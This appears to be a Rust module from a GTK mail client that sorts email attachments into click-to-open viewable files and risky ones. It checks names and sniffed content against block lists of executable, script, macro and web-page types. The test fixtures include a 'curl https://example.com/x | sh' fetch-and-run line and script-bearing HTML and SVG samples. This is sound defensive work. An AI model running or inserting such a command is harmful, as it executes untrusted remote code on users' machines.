//! Which Attachments open on a single click, and which are Risky
//! attachments that need a warning before they are opened.
//!
//! Both judge an Attachment by its name and by its content, sniffed with
//! shared-mime-info, never by the MIME type the sender declared. Names given
//! here must already be safe file names (`Attachment::safe_file_name`), so
//! that bidirectional-override tricks can't hide the real extension.

use gtk::{gio, glib};

/// How much of an Attachment's data is sniffed. Magic numbers sit near the
/// start, and telling text from binary data doesn't need all of a large file.
const SNIFF_LEN: usize = 64 * 1024;

/// The kinds of file a single click opens, in the app the reader chose for
/// them. Each is a kind of document that is only viewed, never run.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ViewableKind {
    Image,
    Pdf,
    PlainText,
}

/// Raster image formats. SVG is left out: it can carry scripts.
const IMAGE_TYPES: &[&str] = &[
    "image/png",
    "image/jpeg",
    "image/gif",
    "image/webp",
    "image/bmp",
    "image/tiff",
    "image/avif",
    "image/heif",
    "image/jxl",
];

/// Extensions of files that can run code when opened: programs, scripts,
/// shortcuts, installers and packages, macro-enabled Office files, and web
/// pages, which run scripts in the browser. Lower case, without the dot.
///
/// Checked as well as the content types below, because shared-mime-info
/// doesn't know all of them, and doesn't know them all by the same name.
#[rustfmt::skip]
const RISKY_EXTENSIONS: &[&str] = &[
    // Windows programs, libraries and control panel items.
    "exe", "com", "scr", "pif", "cpl", "dll", "ocx", "sys", "drv", "efi",
    // Windows installers and packages.
    "msi", "msp", "mst", "msix", "msixbundle", "appx", "appxbundle", "appinstaller", "application",
    "appref-ms", "gadget",
    // Windows scripts and script hosts.
    "bat", "cmd", "vb", "vbs", "vbe", "js", "jse", "mjs", "cjs", "wsf", "wsh", "wsc", "ws", "ps1",
    "psm1", "psd1", "ps1xml", "psc1", "pssc", "hta", "sct", "msc", "reg", "inf",
    // Windows shortcuts and shell files.
    "lnk", "url", "scf", "settingcontent-ms", "library-ms", "searchconnector-ms",
    // Unix programs, scripts and launchers.
    "sh", "bash", "zsh", "csh", "tcsh", "ksh", "fish", "command", "run", "desktop", "py", "pyw",
    "pyc", "pyz", "pl", "pm", "rb", "php", "lua", "tcl",
    // Linux, macOS and Android packages and app bundles.
    "appimage", "flatpak", "flatpakref", "flatpakrepo", "deb", "rpm", "snap", "apk", "pkg", "dmg",
    // Java.
    "jar", "jnlp", "class",
    // Macro-enabled Office files and add-ins, Excel query files, Access databases.
    "docm", "dotm", "xlsm", "xltm", "xlam", "xlsb", "xla", "xll", "xlm", "pptm", "potm", "ppsm",
    "ppam", "sldm", "iqy", "slk", "mde", "mda", "accde", "ade", "adp", "mdb", "accdb",
    // Web pages and other documents that run scripts.
    "html", "htm", "xhtml", "xht", "shtml", "mht", "mhtml", "svg", "svgz", "chm", "xbap",
];

/// Content types of files that can run code when opened, as above. Their
/// subtypes count too.
const RISKY_CONTENT_TYPES: &[&str] = &[
    // Programs and libraries.
    "application/x-executable",
    "application/x-pie-executable",
    "application/x-sharedlib",
    "application/x-dosexec",
    "application/x-msdownload",
    "application/x-ms-dos-executable",
    "application/x-ms-ne-executable",
    "application/vnd.microsoft.portable-executable",
    // Installers and packages.
    "application/x-msi",
    "application/msix",
    "application/vnd.ms-appx",
    "application/vnd.appimage",
    "application/x-iso9660-appimage",
    "application/vnd.debian.binary-package",
    "application/x-rpm",
    "application/vnd.flatpak",
    "application/vnd.flatpak.ref",
    "application/vnd.flatpak.repo",
    "application/vnd.snap",
    "application/vnd.android.package-archive",
    "application/java-archive",
    "application/x-java-archive",
    "application/x-java-jnlp-file",
    // Shortcuts and launchers.
    "application/x-ms-shortcut",
    "application/x-mswinurl",
    "application/x-desktop",
    // Scripts.
    "application/x-shellscript",
    "text/x-shellscript",
    "application/x-csh",
    "text/x-python",
    "text/x-python3",
    "application/x-perl",
    "application/x-ruby",
    "application/x-php",
    "text/javascript",
    "application/javascript",
    "text/vbscript",
    "application/x-bat",
    "application/x-powershell",
    "application/hta",
    "text/x-ms-regedit",
    // Macro-enabled Office files.
    "application/vnd.ms-word.document.macroEnabled.12",
    "application/vnd.ms-word.template.macroEnabled.12",
    "application/vnd.ms-excel.sheet.macroEnabled.12",
    "application/vnd.ms-excel.template.macroEnabled.12",
    "application/vnd.ms-excel.addin.macroEnabled.12",
    "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
    "application/vnd.ms-powerpoint.presentation.macroEnabled.12",
    "application/vnd.ms-powerpoint.template.macroEnabled.12",
    "application/vnd.ms-powerpoint.slideshow.macroEnabled.12",
    "application/vnd.ms-powerpoint.addin.macroEnabled.12",
    "application/vnd.ms-powerpoint.slide.macroEnabled.12",
    // Web pages and other documents that run scripts.
    "text/html",
    "application/xhtml+xml",
    "application/x-mimearchive",
    "image/svg+xml",
    "image/svg+xml-compressed",
    "application/vnd.ms-htmlhelp",
];

/// Whether a single click may open this file directly: its name and its
/// content must both say it is the same kind of viewable file (image, PDF
/// or plain text), and nothing about it may be risky. A `report.pdf` that
/// holds a program, or a `notes.txt` that holds a shell script, is not
/// opened on click.
pub fn opens_on_click(name: &str, data: &[u8]) -> bool {
    let by_name = viewable_kind(&type_from_name(name));
    let by_content = viewable_kind(&type_from_content(data));
    by_name.is_some() && by_name == by_content && !is_risky(name, data)
}

/// Whether this is a Risky attachment: its extension, the type its name
/// suggests, or the type its content is sniffed as, is one that can run
/// code when opened.
pub fn is_risky(name: &str, data: &[u8]) -> bool {
    has_risky_extension(name)
        || is_risky_type(&type_from_name(name))
        || is_risky_type(&type_from_content(data))
}

fn type_from_name(name: &str) -> glib::GString {
    gio::content_type_guess(Some(name), None).0
}

fn type_from_content(data: &[u8]) -> glib::GString {
    gio::content_type_guess(None::<&str>, Some(&data[..data.len().min(SNIFF_LEN)])).0
}

fn viewable_kind(content_type: &str) -> Option<ViewableKind> {
    let is = |other: &str| gio::content_type_equals(content_type, other);
    if IMAGE_TYPES.iter().any(|&image| is(image)) {
        Some(ViewableKind::Image)
    } else if is("application/pdf") {
        Some(ViewableKind::Pdf)
    } else if is("text/plain") {
        // Only plain text itself: scripts, web pages and the like are
        // subtypes of text/plain too.
        Some(ViewableKind::PlainText)
    } else {
        None
    }
}

fn has_risky_extension(name: &str) -> bool {
    let Some((_, extension)) = name.rsplit_once('.') else {
        return false;
    };
    RISKY_EXTENSIONS
        .iter()
        .any(|risky| extension.eq_ignore_ascii_case(risky))
}

fn is_risky_type(content_type: &str) -> bool {
    RISKY_CONTENT_TYPES
        .iter()
        .any(|risky| gio::content_type_is_a(content_type, risky))
}

#[cfg(test)]
mod tests {
    use super::*;

    const PDF: &[u8] = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog >>\nendobj\n";
    const PNG: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x01\0\0\0\x01\x08\x06\0\0\0";
    const JPEG: &[u8] = b"\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\0\0\x01\0\x01\0\0";
    const GIF: &[u8] = b"GIF89a\x01\0\x01\0\x80\0\0\0\0\0\xff\xff\xff";
    const TEXT: &[u8] = "Grüße aus Köln.\nSee you on Monday.\n".as_bytes();
    const ELF: &[u8] = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0\x01\0\0\0";
    const SHELL_SCRIPT: &[u8] = b"#!/bin/sh\ncurl https://example.com/x | sh\n";
    const HTML: &[u8] = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>";
    const SVG: &[u8] = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>x()</script></svg>";
    const DESKTOP_ENTRY: &[u8] = b"[Desktop Entry]\nType=Application\nExec=sh -c x\n";
    const SHORTCUT: &[u8] = b"L\0\0\0\x01\x14\x02\0\0\0\0\0\xc0\0\0\0\0\0\0F";
    const ZIP: &[u8] = b"PK\x03\x04\x14\0\0\0\x08\0";
    const OLE: &[u8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\0\0\0\0\0\0\0\0";

    fn windows_program() -> Vec<u8> {
        let mut data = b"MZ\x90\0\x03\0\0\0\x04\0\0\0\xff\xff\0\0".to_vec();
        data.resize(512, 0);
        data
    }

    #[test]
    fn images_pdfs_and_plain_text_open_on_click() {
        assert!(opens_on_click("photo.png", PNG));
        assert!(opens_on_click("Photo.JPG", JPEG));
        assert!(opens_on_click("photo.jpeg", JPEG));
        assert!(opens_on_click("animation.gif", GIF));
        assert!(opens_on_click("report.pdf", PDF));
        assert!(opens_on_click("Report.PDF", PDF));
        assert!(opens_on_click("notes.txt", TEXT));
    }

    #[test]
    fn an_image_named_as_another_image_format_still_opens() {
        assert!(opens_on_click("photo.jpg", PNG));
    }

    #[test]
    fn other_types_show_the_menu() {
        assert!(!opens_on_click("letter.doc", OLE));
        assert!(!opens_on_click("letter.docx", ZIP));
        assert!(!opens_on_click("archive.zip", ZIP));
        assert!(!opens_on_click("table.csv", b"a,b\n1,2\n"));
        assert!(!opens_on_click("empty.txt", b""));
        assert!(!opens_on_click("README", TEXT));
        assert!(!opens_on_click("drawing.svg", SVG));
        assert!(!opens_on_click("page.html", HTML));
        assert!(!opens_on_click("program.exe", &windows_program()));
        assert!(!opens_on_click("forwarded.msg", OLE));
    }

    #[test]
    fn name_and_content_must_agree() {
        // Content that isn't what the name says.
        assert!(!opens_on_click("report.pdf", &windows_program()));
        assert!(!opens_on_click("report.pdf", ELF));
        assert!(!opens_on_click("report.pdf", ZIP));
        assert!(!opens_on_click("photo.png", PDF));
        assert!(!opens_on_click("notes.txt", SHELL_SCRIPT));
        assert!(!opens_on_click("notes.txt", HTML));
        assert!(!opens_on_click("notes.txt", PNG));
        assert!(!opens_on_click("photo.png", TEXT));
        // A name that isn't what the content is.
        assert!(!opens_on_click("report.exe", PDF));
        assert!(!opens_on_click("photo.png.exe", PNG));
        assert!(!opens_on_click("notes.sh", TEXT));
        assert!(!opens_on_click("notes.html", TEXT));
        assert!(!opens_on_click("report", PDF));
    }

    #[test]
    fn programs_scripts_and_shortcuts_are_risky() {
        for name in [
            "setup.exe",
            "SETUP.EXE",
            "screensaver.scr",
            "tool.com",
            "update.msi",
            "run.bat",
            "run.cmd",
            "invoice.vbs",
            "invoice.js",
            "invoice.wsf",
            "invoice.hta",
            "script.ps1",
            "install.sh",
            "tool.py",
            "app.desktop",
            "app.jar",
            "app.AppImage",
            "app.flatpakref",
            "package.deb",
            "package.rpm",
            "Documents.lnk",
            "site.url",
            "settings.reg",
            "invoice.pdf.exe",
        ] {
            assert!(is_risky(name, b""), "{name} should be risky");
        }
    }

    #[test]
    fn macro_enabled_office_files_are_risky() {
        for name in [
            "budget.xlsm",
            "budget.xlsb",
            "budget.xltm",
            "addin.xlam",
            "letter.docm",
            "letter.dotm",
            "slides.pptm",
            "slides.ppsm",
            "slides.potm",
            "addin.ppam",
        ] {
            assert!(is_risky(name, ZIP), "{name} should be risky");
        }
    }

    #[test]
    fn web_pages_are_risky() {
        assert!(is_risky("page.html", HTML));
        assert!(is_risky("page.htm", HTML));
        assert!(is_risky("drawing.svg", SVG));
        assert!(is_risky("archive.mht", b"MIME-Version: 1.0\r\n"));
    }

    #[test]
    fn risky_content_is_found_behind_a_harmless_name() {
        assert!(is_risky("report.pdf", &windows_program()));
        assert!(is_risky("report.pdf", ELF));
        assert!(is_risky("notes.txt", SHELL_SCRIPT));
        assert!(is_risky("notes.txt", HTML));
        assert!(is_risky("photo.jpg", SVG));
        assert!(is_risky("readme", DESKTOP_ENTRY));
        assert!(is_risky("Documents", SHORTCUT));
    }

    #[test]
    fn documents_and_media_are_not_risky() {
        assert!(!is_risky("report.pdf", PDF));
        assert!(!is_risky("photo.png", PNG));
        assert!(!is_risky("notes.txt", TEXT));
        assert!(!is_risky("letter.doc", OLE));
        assert!(!is_risky("letter.docx", ZIP));
        assert!(!is_risky("budget.xlsx", ZIP));
        assert!(!is_risky("slides.pptx", ZIP));
        assert!(!is_risky("archive.zip", ZIP));
        assert!(!is_risky("table.csv", b"a,b\n1,2\n"));
        assert!(!is_risky("no extension", b""));
        assert!(!is_risky("forwarded.msg", OLE));
    }

    #[test]
    fn only_the_start_of_large_files_is_sniffed() {
        let mut data = TEXT.repeat(SNIFF_LEN / TEXT.len() + 1);
        data.extend_from_slice(&[0; 1024]);
        assert!(opens_on_click("long.txt", &data));
    }
}
